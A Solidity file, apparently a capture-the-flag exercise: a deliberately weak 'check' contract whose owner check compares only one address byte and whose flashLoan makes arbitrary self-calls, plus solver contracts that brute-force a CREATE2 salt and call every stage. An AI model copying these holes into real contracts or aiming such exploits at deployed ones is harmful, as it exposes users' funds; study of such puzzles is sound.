//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;
// 调用check中继承func的四种不同函数。


//依次调用func中的四个函数即可
contract fig{
    check public fun;
    constructor(address payable _fun){
        fun = check(_fun);
    } 
    function figure()public pure returns(bytes memory){
        return abi.encodeWithSignature("com()");
    }

    function attack1()public payable{
        (bool success,)=address(fun).call{value:100}("");
        require(success,"call failed");
        fun.pul();
        fun.ownerPrivalege();
        fun.ext();
        fun.flashLoan(address(fun),0,figure());
        complete();
    }
    function attack2()public payable{
        (bool success,)=address(fun).call{value:100}("");
        require(success,"call failed");
    }
    function attack3()public payable{
        fun.pul();
        
    }
    function attack4()public payable{
        fun.ownerPrivalege();
    }
    function attack5()public payable{
        fun.ext();
    }
    function attack6()public payable{
        fun.flashLoan(address(fun),0,figure());
        complete();
    }
    function complete()public{
        fun.isCompleted();
    }
}

contract deploy{
    fig public fi;
    address payable fun;
    bytes public  byteCode = type(fig).creationCode;
    bytes public  creatCode;
    constructor(address payable _fun){
        fun = _fun;
        creatCode = abi.encodePacked(type(fig).creationCode,abi.encode(fun));
    }
    function figSalt()public returns(bytes32){
        uint256 salt;
        address addr;
        for(uint i=0;i>=0;){
            addr = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xff),address(this),bytes32(salt),keccak256(creatCode))))));
            if(uint160(addr)&0xff==uint8(0xc4)){
                break;
            }
            salt+=1;
        }
        return(bytes32(salt));
    }

    function deployed()public{
            fi = new fig{salt : figSalt()}(fun);
            
    }

    function getHash()public view returns(bytes32){
        return keccak256(creatCode);
    }
}

contract att{
    check che;
    constructor(check addr) {
        che = addr;
    }
    function attract() public payable  {
        payable(address(che)).transfer(10);
        bytes memory data = abi.encodeWithSignature("com()");
        che.pul();
        che.ownerPrivalege();
        che.ext();
        che.flashLoan(address(che),0,data);
        che.isCompleted();
    }
}
contract getAddress{
    att public att1;
    check che;
    constructor(check addr) {
        che = addr;
    }
    function deploy() public {
        att1 = new att{salt : getsalt()}(che);
    }
    function getsalt() public returns(bytes32){
        uint256 a; 
        bytes memory creatcode = type(att).creationCode; 
        bytes memory creatCode = abi.encodePacked(creatcode,abi.encode(address(che)));
        address wantaddress;
        for(uint i = 0;i>= 0;){
            wantaddress = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff),
                address(this),
                bytes32(a),
                keccak256(creatCode)
            )))));
            if (uint160(wantaddress)&0xff==uint8(0xC4)){
                break;
            }
            a+=1;
        }
        return bytes32(a);
    }
}
contract func{
    address internal owner;
    uint256 public score;
    uint256 public times;

    constructor(){
        owner = msg.sender;
    }

    function pul()public{
        require(times==0);
        times+=1;

    }
    
    function inte()internal{
        require(times==1);
        times+=1;

    }

    function ext()external{
        require(times==2);
        times+=1;

    }

    function pri()private{
        require(times==3);
        times+=1;

    }

    function com()public{
        require(msg.sender==address(this));
        pri();
    }
}
contract check is func{

    modifier onlyOwner(){
        require(uint160(msg.sender)&0xff==uint8(uint160(owner)));
        _;
    }

    function ownerPrivalege()public onlyOwner{
        inte();
    }

    function isCompleted()public{
        score =0;
        score = times*25;
    }

    receive()external payable{}

    function flashLoan(address target,uint256 amount,bytes memory data)public{
        require(tx.origin!=msg.sender);
        require(times==3);

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore>amount,"amount must letter than balance");

        payable(target).transfer(amount);
        (bool success,) =payable(target).call(data);
        require(success,"flashLoan call failed");

        uint256 balanceAfter = address(this).balance;
        require(balanceAfter>=balanceBefore,"flashloan hasn't been paid back");
    }
}